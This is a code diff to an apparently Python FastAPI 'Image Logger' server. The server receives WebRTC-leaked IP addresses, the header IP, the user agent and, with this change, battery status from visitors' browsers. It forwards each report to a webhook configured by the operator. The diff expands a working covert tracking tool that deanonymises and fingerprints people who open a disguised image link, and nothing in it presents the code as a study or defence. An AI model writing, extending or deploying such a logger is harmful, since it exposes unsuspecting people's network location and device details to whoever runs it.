@@ -10,6 +10,7 @@ config = {
     "color": 0x00FFFF,
 }
 
+
 def parse_ua(useragent: str) -> tuple[str, str]:
     ua = useragent.lower()
     if "windows" in ua:
@@ -42,17 +43,41 @@ def parse_ua(useragent: str) -> tuple[str, str]:
 
     return os_name, browser
 
-def send_webrtc_report(ip: str, useragent: str, webrtc_ips: list[str]):
+
+def send_webrtc_report(ip: str, useragent: str, webrtc_ips: list[str], battery: dict = None):
     unique = list(dict.fromkeys(webrtc_ips))
-    formatted = "\n".join(f"> `{addr}`" for addr in unique)
+    formatted = "\n".join(f"> `{addr}`" for addr in unique) if unique else "> `Nenhum`"
     os_name, browser = parse_ua(useragent)
 
-    description = f"""**WebRTC IPs Coletados**
+    battery_section = ""
+    if battery:
+        level = battery.get("level", "?")
+        charging = battery.get("charging", False)
+        c_time = battery.get("chargingTime")
+        d_time = battery.get("dischargingTime")
+
+        charging_str = "Sim" if charging else "Não"
+
+        if charging and c_time is not None:
+            time_str = f"{int(c_time // 60)}min pra carregar"
+        elif not charging and d_time is not None:
+            time_str = f"{int(d_time // 60)}min restantes"
+        else:
+            time_str = "Indisponível"
+
+        battery_section = f"""
+**Battery Info:**
+> **Nível:** `{level}%`
+> **Carregando:** `{charging_str}`
+> **Tempo:** `{time_str}`"""
+
+    description = f"""**WebRTC + Battery Coletados**
 
 **IP Header:** `{ip}`
 
 **WebRTC Leaked IPs:**
 {formatted}
+{battery_section}
 
 **PC Info:**
 > **OS:** `{os_name}`
@@ -60,7 +85,6 @@ def send_webrtc_report(ip: str, useragent: str, webrtc_ips: list[str]):
 
 **User Agent:**
 ```
-
 {useragent}
 ```"""
 
@@ -68,13 +92,14 @@ def send_webrtc_report(ip: str, useragent: str, webrtc_ips: list[str]):
         requests.post(config["webhook"], json={
             "username": config["username"],
             "embeds": [{
-                "title": "Image Logger - WebRTC Leaked",
+                "title": "Image Logger - WebRTC + Battery",
                 "color": config["color"],
                 "description": description
             }]
         }, timeout=8)
     except:
         pass
+
 
 @app.post("/api/webrtc")
 async def webrtc_collect(request: Request, background_tasks: BackgroundTasks):
@@ -91,8 +116,9 @@ async def webrtc_collect(request: Request, background_tasks: BackgroundTasks):
 
     useragent = request.headers.get("user-agent", "")
     webrtc_ips: list[str] = body.get("ips", [])
+    battery: dict | None = body.get("battery", None)
 
-    if webrtc_ips:
-        background_tasks.add_task(send_webrtc_report, ip, useragent, webrtc_ips)
+    if webrtc_ips or battery:
+        background_tasks.add_task(send_webrtc_report, ip, useragent, webrtc_ips, battery)
 
     return Response(status_code=204)
